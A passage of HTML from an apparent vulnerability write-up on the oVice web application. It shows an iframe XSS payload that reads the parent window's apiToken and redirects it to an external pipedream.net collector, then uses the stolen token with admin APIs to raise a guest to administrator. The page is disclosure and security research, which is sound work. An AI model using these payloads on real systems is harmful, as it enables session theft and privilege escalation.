720w,\n/static/a3d3fc6db8be7b1dc1c7eb9ca8513423/302a4/x_3.png 1080w,\n/static/a3d3fc6db8be7b1dc1c7eb9ca8513423/71ee9/x_3.png 1081w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">apiToken</code> is a necessary value when performing an api call that requires authorization, and is used as a value of secure-header <code class=\"language-text\">Authorization</code>, and as a result of analyzing the API flowchart of the oVice Web Application, a total of 52 or more parts use the value.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACPklEQVQozzWQz0/TcByGy8WLMSbqjRte/LOMBxMTY9SDoiYaYjQYj5L4FygHDygqMSSsQNd+vx2lg/1ou5+Frd2AbcBAtrFBH7MtfpI3n/f05MmrNJqNqNFsMvxnZ2cMu2VvkbBs0lmHjOOSTKXZzXoENR9/p8BpJaAVVimHRWqBz3F5JzoNA7qdeqRYGxa+70e1Wo16vT4KXDK+aJzLHvtumuNVjXJKsJ8QHOkG+a04NVOnt2LQMYzoYmCi2LYdZbMOpVIp2vF9HK/A3GrAJ22P2eUKr37uMPO7wqKzQTK3RtMwIGZS2NZZDFWSrsZ5TERdKbjoJyIlmbTx/TKtVpPT9iHFap1bMx5XX+dQnrsoj7MoT1zmZIIgvc6JatBTBaeaoKnrHGsGnZhBRxhDIIohNshkcpTKVSq7ISmvwp2PeaY+FLkxk0OZdrjywuOzadK24nRVSUeT9Nckg5hgoEq6qqA3NBwMgfFtMqkKeW+fcv4Aa6vK7dkck+8LXHvtoTxzUKZdvv8yQdPJ2XHChD6CHWo6DV2nOzIUY8Mfq8tRLGkivBRWMUMsnWJq1hsBr7/xmJh2mXjpsLQgQRO01wVnmiRSTfJJDZlbox+TdP8b/lmRmHY+2nICMm7A+maZyXd5br4tjsyUR1mUp1mWFhKgCgq2Ts0SXKiSdtzg0Bhv2pVyDEynt6MwrHJ01Ir+nhwR7O3xcN7h/heXB9987n4tcW/eR5Wb+Jk4B8LgfE3SW5cj0Plwv2FMyUXf5B+avlq5iByTqwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Attack Vector\"\n        title=\"Attack Vector\"\n        src=\"/static/31375f1e6ebc6f13a93814caa1cc15c4/37523/x_8.png\"\n        srcset=\"/static/31375f1e6ebc6f13a93814caa1cc15c4/e9ff0/x_8.png 180w,\n/static/31375f1e6ebc6f13a93814caa1cc15c4/f21e7/x_8.png 360w,\n/static/31375f1e6ebc6f13a93814caa1cc15c4/37523/x_8.png 720w,\n/static/31375f1e6ebc6f13a93814caa1cc15c4/302a4/x_8.png 1080w,\n/static/31375f1e6ebc6f13a93814caa1cc15c4/07a9c/x_8.png 1440w,\n/static/31375f1e6ebc6f13a93814caa1cc15c4/b5cfe/x_8.png 1767w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>As shown in the following figure, it is used in workspace in another domain based on <code class=\"language-text\">apiToken</code>, and if the authority for that API is more than a member or administrator, you can perform the function using token.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 95.55555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAAE7klEQVQ4y42UeUwUZxjGP1koEhYQ1z1kuXZm5/hmdpmdGRZYVgQ5FYQiWC2KWIlcMaixYMTG5VpWRbGK1ogKKJJqvdpStVFOaxskVvHYwALVqKnYaDHV0OJVp5k1bZMmmL7Jm3x/PXm+3/s+LwCTFITM362A0MDr9RypVgchCqUmlyC5TcEaeoMG0X0ikXjNQRGSoCnWACHDgEkFKQZQlEFsBQH1kRjJ5NF6oy0ldeHBVcXrWnM+ymt5f8Gi1pL1ZeVxScmpGgzG0jTLg3c5pCADdDSroPVsrF8QmmfbWutoaNgvtHd0jF+89N3E6a9OTwwMDLyptNpqPLynz+O48LBJBUV3PBcJQkPNMi0O0zx9ZUuvXu/vvXixR2hsaha6urqFzgttwvCQXajZtqXSzWNqAsebwkBT3EZwPr0enEmtA2fSdoJzyRbg5eYOMIwCKEICktArERRf6KNQpvT2XT517/79scHBoZ8HHPYHBw/2P65qGH26ov7uFSqmIIdE1CwQBAE8s7S4/G456jpWdtj14Sqb6+N11a5tmbmuPjIFkMtVGKIlkhBc9zHLm1sLiop31dbtqK6oqqxZVlhRW1i6vy5+YVkJHjIrHUKadwr+ZjkEhE0t4I9l1eBRYjZ4vmIVGC3YIP58ikrpB/VMaLRfMLp85+7ddpHh2XPnXrZ3dr4+cfLo66HBW6+sNRUWd0+vRI6PCHvrsPxI+htL68aJol2FTz5YUzBeULJ2fHVVEeniLp+pwdQISmRIfWVLrly7ellk2NR8SOjq7hG62r8RRobtgq3WVuk61T2B5yPDgErLS3/My4Zn131h+3rfecfJA6cGm22Nx1vmzEv0nz4Nk8lVFAn1KT4KVbLI8L7I0PGWYVNj/6+2xtFnuXvu9MGY/ByI+LPAFJU8TXQ5q/jLrEs3fhFujDwSDnx793sAABkcqNAYmHAVrefMGoxez/LmI06G23dUl1dVWLMLrdvzS1vq4xdXlxGGmAWQpHhAkCHeJgR48Ka1VHLa6hNJ85YPJ6dXZ7sAoPPykiIzZ/qTGEHPVWu0Of9leNzJ8OZLa035JndPaaJzbXAck9I6zlscAKKFc3UGczkAwJMJoaUeHh5BKEoEahA8Uzp9RtY/DMU97O4RutvbhNvDdmHz1uoKyXtu8XxoZBggCOgS5O87xRi1RHLszFMXcbSpi8rcGg40i09PP78AjAs1RXvLlfMv9/WJDJ8MOoYfDDjso4ear41tOzw6vvKz271k9MplEA1gAY7jQIsigDEYQYAEgOiEbBAaHg3kcjVQKv2ATKYgUQwmILiuhOXNLflFxTudDCvLrUsLtu5YWXpsb8KSOgvBxmVAEvJOQRwnAIZpgYGPApwxBtB6DiAIPgVBCGdSAoPRTJHhp/X19n37GkSGL9o7Ol8fP/H5q6HBmy+sVsu/DCcrmmYBx5kAz0fKcIKeL/WVZV293v+DM8uNTc4s93S0CXdGbglbtlRaJG6StwzfeQ9JRhSWhxiMsT5y1YLunp4Ld+/dez488tOYY2jgSeuRaxN7jj38M3/vSC8RtSKbQgPZd99DaBBbTtJMHE7p01hjRGZMfNJic3Tsh7PnzM6iZ5XmBpu3r4nIqC/Vh6dkEDjO/y9BSDGRkGJMKEZFBASi4QFB2nB1gNZEoDOMenQqH6wAHIHjERTNcn8BgB74Y0azzncAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"attack flow\"\n        title=\"attack flow\"\n        src=\"/static/95d484f1964e35f2e8e71aeeb5d5e036/37523/x_10.png\"\n        srcset=\"/static/95d484f1964e35f2e8e71aeeb5d5e036/e9ff0/x_10.png 180w,\n/static/95d484f1964e35f2e8e71aeeb5d5e036/f21e7/x_10.png 360w,\n/static/95d484f1964e35f2e8e71aeeb5d5e036/37523/x_10.png 720w,\n/static/95d484f1964e35f2e8e71aeeb5d5e036/302a4/x_10.png 1080w,\n/static/95d484f1964e35f2e8e71aeeb5d5e036/07a9c/x_10.png 1440w,\n/static/95d484f1964e35f2e8e71aeeb5d5e036/29007/x_10.png 1600w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"xss-attack-to-steal-apitoken\" style=\"position:relative;\"><a href=\"#xss-attack-to-steal-apitoken\" aria-label=\"xss attack to steal apitoken permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>xss attack to steal apiToken</h2>\n<h3 id=\"you-thought-it-was-safe-right\" style=\"position:relative;\"><a href=\"#you-thought-it-was-safe-right\" aria-label=\"you thought it was safe right permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>You thought it was safe, right?</h3>\n<ul>\n<li>If an internal script similar to XSS is operated in terms of Client-Side, it is a problem because it can trigger data on the App object in the <code class=\"language-text\">window object.</code></li>\n<li>As described in the xss bug report, <code class=\"language-text\">inline script</code> may be executed due to insufficient src verification of <code class=\"language-text\">iframe plugin</code>.</li>\n</ul>\n<h3 id=\"child-frame-escape\" style=\"position:relative;\"><a href=\"#child-frame-escape\" aria-label=\"child frame escape permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>child frame escape</h3>\n<ul>\n<li><code class=\"language-text\">window.App</code> In order to access an object, it is necessary to escape the child frame of the iframe.</li>\n</ul>\n<p>To escape, approach it as a <code class=\"language-text\">window.parent</code> parent.</p>\n<ul>\n<li>If you check the location, you can see that it exists in different locations.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACQElEQVQozy2RS08aARSF53e0xYF5OMPAwAADpZrYpn/MnYvu265NuuqmmyZtY+rCqCDQIsjD8jQaYBIUy0ul6nwN0y5O7ll995wcYTKZsFgs3Ol0SqvVYjQa0Wg0GE8m3D88MHAcCvk8r1++IhFPkrBsotE4djSBZcbQjbBrGGHXDJrEjHBTuLu7c6+vr1kCHcdh6Zf36nLo+eWDcrlMem2DSDiKYSXRInGU1SCSqiMqq/gVDVFSXV1SEdrtNrlczm02m9TrdQaDAbVaHaffYz6fe/BCoYAVT6KrOoaVQo7biH4JUfTkevLLBGX1UahWa5xUKhSPj2m3O3Q6Z3S7Z9zc3vIITGdzTipVojHbA+oRGyuZRlZ1njwTeerz41sJ4BMltICCMB6Pmc1mzG9uvHSVStVL1Ol26fX7zKZTftX/A1eDJK0k6dQ6z2M2iVAEUzcI6QamYZIIhhEmoxGjy0tPrUaDaqVKrVql02xy3m5x1hvy4csRVizhAa34c8xkmrBpEQpHUTQDWTdQDRNTCyG0TuscF4tuNpNhb3eXUiZDdm+Pn4UCJ6US+/uHfPz0GStuoy0rWymkF2ushCMosorql5H8sutVlhRXWNz/cXuOQ77wgzdbWxx8/cbW5ialUpnZ/Jbt7W3ev3tLKr2OpmgYERszkUJSNYIBBVNSUQMKKwHF1WUVYTqb0b24cM97fbJHOfLFCgeHWZzhkKvfY+qnDXZ2vhNLpLxRgtEU9tqGV1cMKPj8MqJf/reypE7+Aj4KxuuHxMEGAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"iframe security escape\"\n        title=\"iframe security escape\"\n        src=\"/static/bccd9e9d62297957c291125aee789514/37523/---467.png\"\n        srcset=\"/static/bccd9e9d62297957c291125aee789514/e9ff0/---467.png 180w,\n/static/bccd9e9d62297957c291125aee789514/f21e7/---467.png 360w,\n/static/bccd9e9d62297957c291125aee789514/37523/---467.png 720w,\n/static/bccd9e9d62297957c291125aee789514/302a4/---467.png 1080w,\n/static/bccd9e9d62297957c291125aee789514/07a9c/---467.png 1440w,\n/static/bccd9e9d62297957c291125aee789514/2c118/---467.png 1505w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">Frame redirection</code> is performed to transfer data to the outside using the <code class=\"language-text\">location.href</code> attribute.</li>\n<li>When proceeding with redirection, it is delivered with reference to <code class=\"language-text\">window.parent.App</code></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token literal-property property\">javascript</span><span class=\"token operator\">:</span>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">'https://34262b51514dfe4a89d127042ade5798.m.pipedream.net/?'</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">.</span>parent<span class=\"token punctuation\">.</span>App<span class=\"token punctuation\">.</span>apiToken<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>As a result of delivering the <code class=\"language-text\">apiToken</code> value to an external server by referring to <code class=\"language-text\">window.person.App</code>, the <code class=\"language-text\">CSP</code>is not applied to the main flow, so you can check the data.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABXElEQVQY01WP3U7bQBCF/f7PUOg7gIAWFVMRJaKoES1polKVAknseB2v/3e98Xr9VXEuEEcazcXRfHOON5lMmM1mnF9ccHJ6yvW1z/nZCb/mC+7vf/Dh6Ajf94niBGVatGmptKEoa7KioJQptqpxgHMObzQa8fLyyre7Oz59vuTqyxXjGx8pM5bLFR+PjxmPJyil6PvDkbXdACzKkrqqaNIMq5sD8Od0ShSGZFISLtckUYyuatbPr5zdfuX3eMTD7Xe0adir7/sBWNUKpTWqrLBpRqcUzlq856cntNZEQhBuNog4JggC2nZfTQ/P/j0+ops3YNd15FlOKSWmrnG73T764Ht/FwuKPGcTRYRhiBCC1WpFYwxmt6NIJX8W8zegc3TOkYgtUsTkiaTKclReoHSDJ8KAbbhBBMEwcRASrdekIibdJlxOl8we5hjzPqFMM8qixFqLbdvDth3/AZnGvm+nV6cHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"ovice iframe xss\"\n        title=\"ovice iframe xss\"\n        src=\"/static/ec995dd1712f3f62262c4f9eb3f4ffaa/37523/x_11.png\"\n        srcset=\"/static/ec995dd1712f3f62262c4f9eb3f4ffaa/e9ff0/x_11.png 180w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/f21e7/x_11.png 360w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/37523/x_11.png 720w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/302a4/x_11.png 1080w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/07a9c/x_11.png 1440w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/a80b8/x_11.png 1497w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"user-permission-setting-api\" style=\"position:relative;\"><a href=\"#user-permission-setting-api\" aria-label=\"user permission setting api permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>User Permission Setting API</h3>\n<ul>\n<li>When a user with administrative authority is attacked by the XSS, the attacker can steal <code class=\"language-text\">apiToken</code>, which can be used to call api of administrative authority.</li>\n</ul>\n<h3 id=\"increase-authority-using-administrator-function-based-on-session-stealing-through-xss-attack\" style=\"position:relative;\"><a href=\"#increase-authority-using-administrator-function-based-on-session-stealing-through-xss-attack\" aria-label=\"increase authority using administrator function based on session stealing through xss attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Increase authority using administrator function based on session stealing through XSS attack.</h3>\n<ul>\n<li>\n<p>The following are functions that allow users to change their rights through administrator rights.</p>\n</li>\n<li>\n<p>The <code class=\"language-text\">/api/v1/workspaceuser/change/auth</code>  API can change the rights of the target user by delivering <code class=\"language-text\">workspace_user_id_to_update, workspace_user_id, workspace_id, auth</code> data to POST.</p>\n</li>\n<li>\n<p>The authority to change the user authority is divided into administrator and member authority, and each may deal with a lower authority.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\">admin <span class=\"token operator\">-</span><span class=\"token operator\">></span> admin<span class=\"token punctuation\">,</span> member<span class=\"token punctuation\">,</span> visitor<span class=\"token punctuation\">,</span> guest\nmember <span class=\"token operator\">-</span><span class=\"token operator\">></span> member<span class=\"token punctuation\">,</span> visitor<span class=\"token punctuation\">,</span> guest</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABXElEQVQY01WP3U7bQBCF/f7PUOg7gIAWFVMRJaKoES1polKVAknseB2v/3e98Xr9VXEuEEcazcXRfHOON5lMmM1mnF9ccHJ6yvW1z/nZCb/mC+7vf/Dh6Ajf94niBGVatGmptKEoa7KioJQptqpxgHMObzQa8fLyyre7Oz59vuTqyxXjGx8pM5bLFR+PjxmPJyil6PvDkbXdACzKkrqqaNIMq5sD8Od0ShSGZFISLtckUYyuatbPr5zdfuX3eMTD7Xe0adir7/sBWNUKpTWqrLBpRqcUzlq856cntNZEQhBuNog4JggC2nZfTQ/P/j0+ops3YNd15FlOKSWmrnG73T764Ht/FwuKPGcTRYRhiBCC1WpFYwxmt6NIJX8W8zegc3TOkYgtUsTkiaTKclReoHSDJ8KAbbhBBMEwcRASrdekIibdJlxOl8we5hjzPqFMM8qixFqLbdvDth3/AZnGvm+nV6cHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"privilege escalation traffix debugging\"\n        title=\"privilege escalation traffix debugging\"\n        src=\"/static/ec995dd1712f3f62262c4f9eb3f4ffaa/37523/x_11.png\"\n        srcset=\"/static/ec995dd1712f3f62262c4f9eb3f4ffaa/e9ff0/x_11.png 180w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/f21e7/x_11.png 360w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/37523/x_11.png 720w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/302a4/x_11.png 1080w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/07a9c/x_11.png 1440w,\n/static/ec995dd1712f3f62262c4f9eb3f4ffaa/a80b8/x_11.png 1497w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Use <code class=\"language-text\">/api/v1/workspace/getWorkspaceUsers</code> and <code class=\"language-text\">/api/v1/workspace/getDashboardWorkspaceUsers</code> APIs to collect data needed when calling the privilege-raising API using tokens.</li>\n<li>Based on the collected data, <code class=\"language-text\">/api/v1/workspaceuser/change/auth</code>, an API for raising authority, was called to raise the target authority to Guest->Admin.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token operator\">/</span>api<span class=\"token operator\">/</span>v1<span class=\"token operator\">/</span>workspace<span class=\"token operator\">/</span>getWorkspaceUsers\n<span class=\"token operator\">/</span>api<span class=\"token operator\">/</span>v1<span class=\"token operator\">/</span>workspace<span class=\"token operator\">/</span>getDashboardWorkspaceUsers</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABoUlEQVQoz12RyXKjMBiEhbFZLcS+CUNYDF4Kxy677MpUTnOZebLR6/IC8/8pwMksh67u/iRd1GRTHCEvewyTFuK0xYR3aNIUJdlGsmBf/pn/59LCfvIny4sjvj2+w/XyDu3uBtvuClX9Cn5QguuXsLb45MzJgbIM1oyDF4w8BS+oQGcprJ0cLKcARQuAlFUPb6cHPPoHBGEFuhGCxjJQKAfDjEA3QzBpAiaNwVjHoJvRk0dAaQKhyiHQI7AtH1aqD2RT7LHenjDLO6yaHpvqgG53R9pckSflxPNih5u8w4TXyLMtprzBojpgwzv8oZ3xZ9ji+cVDkyZIqMV/qZovpAUTZGEJIllClplYLm0hK56QV65YKt6slfvss8uKK4jmCKK4Qlr50x1SbS8DL45Dku2GOG2HLD8MmhENRLIGsmCzxvx3/xT5l0myPZC6OeP98o7X12/Y7W9YlD2+1Cd0gxKZk0+L226Blp1NmTKOtjtzxysmt+zNdL5SfRxH+X073uGyv4HFMlgq3vTh42KaEYGqz6Po63jKo/7w9KuPGt9+ABhRunVigJ74AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"exploit\"\n        title=\"exploit\"\n        src=\"/static/a655febb62d7a77a9ac5df01d1bd4e73/37523/exploit.png\"\n        srcset=\"/static/a655febb62d7a77a9ac5df01d1bd4e73/e9ff0/exploit.png 180w,\n/static/a655febb62d7a77a9ac5df01d1bd4e73/f21e7/exploit.png 360w,\n/static/a655febb62d7a77a9ac5df01d1bd4e73/37523/exploit.png 720w,\n/static/a655febb62d7a77a9ac5df01d1bd4e73/636c2/exploit.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"payload\" style=\"position:relative;\"><a href=\"#payload\" aria-label=\"payload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Payload</h2>\n<h3 id=\"stealing-apitoken-sessions-using-xss-attacks\" style=\"position:relative;\"><a href=\"#stealing-apitoken-sessions-using-xss-attacks\" aria-label=\"stealing apitoken sessions using xss attacks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stealing apiToken sessions using XSS attacks.</h3>\n<ul>\n<li>Two levels of payload should be operated.</li>\n<li>In order to obtain the <code class=\"language-text\">apiToken</code> value of the user who wants to steal based on <code class=\"language-text\">iframe XSS</code>, the <code class=\"language-text\">apiToken</code> is sent to the response server by obtaining the value of the <code class=\"language-text\">App in the window parent object.</code></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\">javascript:window.location.href='<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>RevicedServer</span><span class=\"token punctuation\">></span></span>?'+(window.parent.App.apiToken)</code></pre></div>\n<h3 id=\"gathering-necessary-information\" style=\"position:relative;\"><a href=\"#gathering-necessary-information\" aria-label=\"gathering necessary information permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 